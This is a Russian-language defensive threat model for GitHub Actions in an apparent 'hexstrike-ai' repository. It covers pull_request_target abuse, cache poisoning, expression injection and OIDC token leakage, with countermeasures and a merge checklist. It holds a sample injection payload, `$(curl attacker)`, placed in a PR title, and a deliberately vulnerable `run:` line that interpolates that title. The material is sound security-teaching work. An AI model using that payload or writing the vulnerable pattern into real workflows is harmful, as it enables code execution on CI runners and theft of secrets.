# GitHub Actions — учебный threat model (симуляция, без эксплуатации)

**Status:** Defensive reference only — **не** включать уязвимые workflow в `.github/workflows/`.

Цель: понять цепочку атакующего и контрмеры для HexStrike / signing infra.

---

## Текущий статус hexstrike-ai

| Проверка | `.github/workflows/agent-battle.yml` |
|----------|-------------------------------------|
| `pull_request_target` | ❌ не используется |
| OIDC `id-token: write` | ❌ не используется |
| `actions/cache` | ❌ не используется |
| Secrets в CI | ❌ не используются |
| Expression injection | ❌ нет `${{ github.event.* }}` в `run:` |

**Вывод:** production CI в этом репо **не** попадает под fork-to-base / OIDC сценарии Grafana-style.

Реальный IR-контур: Jenkins + VPS + off-node signing keys — см. `docs/forensics/INCIDENT-CONCLUSION.md`.

---

## Сценарий 1 — Fork-to-Base (`pull_request_target`)

### Как атакующий думает (симуляция)

1. Fork публичного репозитория.
2. PR с изменением workflow или скрипта, который должен выполниться «от имени base repo».
3. Триггер `pull_request_target` запускает workflow **из default branch**, но checkout часто берёт **head fork** → untrusted code + elevated token.

### Уязвимый паттерн (НЕ КОПИРОВАТЬ)

См. `docs/examples/gh-actions-01-vulnerable.example.yml` — только для чтения.

### Контрмеры

- Использовать `pull_request` (fork PR **без** secrets base repo).
- Если `pull_request_target` неизбежен — **никогда** не checkout PR head; только merge commit или manual approval + isolated runner.
- Branch protection: required reviewers, block workflow edits from external contributors.

---

## Сценарий 2 — Cache Poisoning

### Симуляция

1. Attacker PR кладёт payload в cache key/path, общий с trusted branch.
2. Следующий trusted job читает отравленный cache → supply-chain в build.

### Контрмеры

- Cache key включает `github.ref` / `github.sha`.
- Не делить cache между fork PR и `main`.
- Prefer immutable deps (`go.sum` hash, lockfiles).

---

## Сценарий 3 — Expression Injection (CWE-94)

### Симуляция

PR title/body: `` `$(curl attacker)` `` или newline injection.

Если workflow:

```yaml
run: echo "${{ github.event.pull_request.title }}"
```

→ shell выполняет подстановку **до** запуска step → RCE на runner.

### Контрмеры

```yaml
env:
  PR_TITLE: ${{ github.event.pull_request.title }}
run: echo "$PR_TITLE"   # всё ещё риск — лучше не использовать PR text в shell
```

- Передавать через `env:` и **не** использовать в `run:` для fork PR.
- Для untrusted input — `actions/github-script` / отдельный sandbox job без secrets.

---

## Сценарий 4 — OIDC Token Leakage

### Симуляция

Workflow с:

```yaml
permissions:
  id-token: write
```

+ malicious step, который exfiltrates JWT → cloud role assumption, если trust policy широкая.

### Контрмеры

- Минимальные `permissions:` (default read-only).
- Cloud trust policy: жёсткий `sub` (`repo:ORG/hexstrike-ai:ref:refs/heads/main`), `aud`, environment.
- Signing keys **не** в GH Actions для public/forkable repos.

---

## Side-by-side примеры

| Файл | Назначение |
|------|------------|
| `docs/examples/gh-actions-01-vulnerable.example.yml` | Anti-patterns (reference) |
| `docs/examples/gh-actions-02-hardened.example.yml` | Recommended pattern |

### Локальная «симуляция» (read-only)

```bash
# Mac / VPS — только diff и checklist, без запуска уязвимого CI
bash scripts/ci-threat-model-check.sh
```

---

## Checklist перед merge любого workflow

- [ ] Нет `pull_request_target` без security review
- [ ] `permissions:` явно ограничены
- [ ] Нет secrets на fork PR jobs
- [ ] Нет `${{ github.event.pull_request.* }}` в `run:`
- [ ] Cache keys scoped by ref
- [ ] OIDC audience/subject в cloud policy
- [ ] `BOT_PRIVATE_KEY` / payroll keys **не** в GitHub Secrets

---

*Defensive threat modeling only — no unauthorized exploitation.*
